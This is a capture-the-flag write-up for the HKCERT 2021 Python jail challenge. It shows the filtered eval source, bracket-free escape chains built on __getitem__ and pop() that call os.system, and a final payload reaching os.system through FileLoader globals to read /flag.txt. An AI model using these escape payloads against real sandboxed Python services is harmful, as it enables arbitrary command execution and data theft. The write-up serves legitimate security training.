# HKCERT2021 - 所有遺失的東西
- Write-Up Author: Ivan Mak \[[MOCTF](https://hackmd.io/JH0dysBTSx6H1o1PZ7OqWg)\]

- Flag: hkcert21{nev3r_uSe_pYth0n_45_sanDBox}

## **Question:**
所有遺失的東西 (150 points)

>Challenge description

![img](./img/1.png)

Attachment: [pyjail1_f7be93352498ebd158a0a9fc069b30e9.zip](./pyjail1_f7be93352498ebd158a0a9fc069b30e9.zip)

## Write up

1. First, let’s see the source code as below:

```
backup_eval = eval
backup_print = print
input = input()
if '[' in input or ']' in input:
    print('[You failed to break the jail]')
    exit(-1)
globals()['__builtins__'].__dict__.clear()
backup_print(backup_eval(input,{},{}))
```

From source code, we can get to know 3 points:
- From “**input = input()**” and “**backup_print(backup_eval(input,{},{}))**”, our input will be treated as string normally, and with some trial we can get to know the program is written in Python 3, we cannot do direct escape like in Python 2. With this point one thing we may consider is to leverage builtin modules (e.g. __builtin__  or  magic function like__class__) to escape and run system command. 
- From “**if '[' in input or ']' in input:**”, “[“ and “]” is filtered, which is generally needed when calling __builtin__, __class__
- From “**globals()['__builtins__'].__dict__.clear()**”, seems the approach using  “__builtin__”  should not work.

Up to this moment, we can get one feasible approach (I should say seems feasible) to use approach of calling magic function like __class__, and think of a way to call system command by not using “[“ and “]”.

2. Next, let’s explore if it’s possible by not using “[“ and “]”.  

After some research I got [this link](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/)

過濾中括號
其中部分[]被過濾掉時，
• 調用__getitem__()函數直接替換；
• 調用pop()函數（用於移除列表中的一個元素，默認最終一個元素，並且返回該元素的值）替換；

如：
```
#代表
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')
# __getitem__()替換中括號[]
''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('calc')

#pop()替換中括號[]，結合__getitem__()利用
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('calc')
```

It means that when “[“ and “]” are filtered, we may use pop() and __getitem__() together to perform Python Sandbox Escape. So the approach to use __class__ without using “[“ and “]” likely is the right approach.

3. We can start to craft the payload and get the flag

First we need to know all the classes available to be called. This link is very good to explain how we can get the subclasses available: [Analysis of Python Sandbox Escape (sourceexample.com)](https://sourceexample.com/article/en/85036c9f263817cc353fe9752c9b4c2c/), with the method introduced in the article (but remember we need to use pop() and __getitem__ to avoid our payload being filtered), when we try to get subclasses with ''.__class__.__mro__.__getitem__(-1), we can get the subclasses list as below:

```
<class 'type'>, 
<class 'weakref'>, 
<class 'weakcallableproxy'>, 
<class 'weakproxy'>, 
<class 'int'>, 
<class 'bytearray'>, 
<class 'bytes'>, 
<class 'list'>, 
<class 'NoneType'>, 
<class 'NotImplementedType'>, 
<class 'traceback'>,
<class 'super'>,
<class 'range'>, 
<class 'dict'>, 
<class 'dict_keys'>, 
<class 'dict_values'>, 
<class 'dict_items'>, 
<class 'dict_reversekeyiterator'>, 
<class 'dict_reversevalueiterator'>, 
<class 'dict_reverseitemiterator'>, 
<class 'odict_iterator'>, 
<class 'set'>, 
<class 'str'>, 
<class 'slice'>, 
<class 'staticmethod'>,
<class 'complex'>, 
<class 'float'>, 
<class 'frozenset'>, 
<class 'property'>, 
<class 'managedbuffer'>, 
<class 'memoryview'>, 
<class 'tuple'>, 
<class 'enumerate'>, 
<class 'reversed'>, 
<class 'stderrprinter'>, 
<class 'code'>, 
<class 'frame'>, 
<class 'builtin_function_or_method'>, 
<class 'method'>, 
<class 'function'>,
<class 'mappingproxy'>, 
<class 'generator'>,
<class 'getset_descriptor'>,
<class 'wrapper_descriptor'>, 
<class 'method-wrapper'>, 
<class 'ellipsis'>, 
<class 'member_descriptor'>, 
<class 'types.SimpleNamespace'>, 
<class 'PyCapsule'>, 
<class 'longrange_iterator'>, 
<class 'cell'>, 
<class 'instancemethod'>, 
<class 'classmethod_descriptor'>, 
<class 'method_descriptor'>, 
<class 'callable_iterator'>, 
<class 'iterator'>, 
<class 'pickle.PickleBuffer'>,
<class 'coroutine'>, 
<class 'coroutine_wrapper'>, 
<class 'InterpreterID'>, 
<class 'EncodingMap'>,
<class 'fieldnameiterator'>, 
<class 'formatteriterator'>, 
<class 'BaseException'>, 
<class 'hamt'>, 
<class 'hamt_array_node'>, 
<class 'hamt_bitmap_node'>, 
<class 'hamt_collision_node'>, 
<class 'keys'>,<class 'values'>,
<class 'items'>,<class 'Context'>, 
<class 'ContextVar'>, 
<class 'Token'>, 
<class 'Token.MISSING'>, 
<class 'moduledef'>,
<class 'module'>, 
<class 'filter'>, 
<class 'map'>, 
<class 'zip'>, 
<class '_frozen_importlib._ModuleLock'>,
<class '_frozen_importlib._DummyModuleLock'>, 
<class '_frozen_importlib._ModuleLockManager'>, 
<class '_frozen_importlib.ModuleSpec'>, 
<class '_frozen_importlib.BuiltinImporter'>,
<class 'classmethod'>, 
<class '_frozen_importlib.FrozenImporter'>,
<class '_frozen_importlib._ImportLockContext'>,
<class '_thread._localdummy'>, 
<class '_thread._local'>, 
<class '_thread.lock'>, 
<class '_thread.RLock'>, 
<class '_io._IOBase'>, 
<class '_io._BytesIOBuffer'>,
<class '_io.IncrementalNewlineDecoder'>, 
<class 'posix.ScandirIterator'>,
<class 'posix.DirEntry'>,
<class '_frozen_importlib_external.WindowsRegistryFinder'>, 
<class '_frozen_importlib_external._LoaderBasics'>, 
<class '_frozen_importlib_external.FileLoader'>, 
<class '_frozen_importlib_external._NamespacePath'>, 
<class '_frozen_importlib_external._NamespaceLoader'>, 
<class '_frozen_importlib_external.PathFinder'>,
<class '_frozen_importlib_external.FileFinder'>, 
<class 'zipimport.zipimporter'>, 
<class 'zipimport._ZipImportResourceReader'>,
<class 'codecs.Codec'>,
<class 'codecs.IncrementalEncoder'>, 
<class 'codecs.IncrementalDecoder'>, 
<class 'codecs.StreamReaderWriter'>, 
<class 'codecs.StreamRecoder'>, 
<class '_abc._abc_data'>, 
<class 'abc.ABC'>,
<class 'dict_itemiterator'>,
<class 'collections.abc.Hashable'>, 
<class 'collections.abc.Awaitable'>, 
<class 'types.GenericAlias'>, 
<class 'collections.abc.AsyncIterable'>,
<class 'async_generator'>, 
<class 'collections.abc.Iterable'>, 
<class 'bytes_iterator'>, 
<class 'bytearray_iterator'>, 
<class 'dict_keyiterator'>,
<class 'dict_valueiterator'>, 
<class 'list_iterator'>,
<class 'list_reverseiterator'>, 
<class 'range_iterator'>, 
<class 'set_iterator'>, 
<class 'str_iterator'>,
<class 'tuple_iterator'>, 
<class 'collections.abc.Sized'>,
<class 'collections.abc.Container'>, 
<class 'collections.abc.Callable'>, 
<class 'os._wrap_close'>, 
<class '_sitebuiltins.Quitter'>, 
<class '_sitebuiltins._Printer'>, 
<class '_sitebuiltins._Helper'>
```

We need to find a class which can call OS command. With some research and test (including some failures), We can get a class called **<class '_frozen_importlib_external.FileLoader'>**, and the index number is 99 (well, you may count by manual or write a simple python script to do the counting) which may be able to call OS command. With some tries here is our payload worked (with leverage pop and __getitem__):

```
''.__class__.__mro__.__getitem__(-1).__subclasses__().pop(99).__init__.__globals__.get('_os').__dict__.get('system')('cat /flag.txt')
```

Get the flag:
> hkcert21{nev3r_uSe_pYth0n_45_sanDBox}
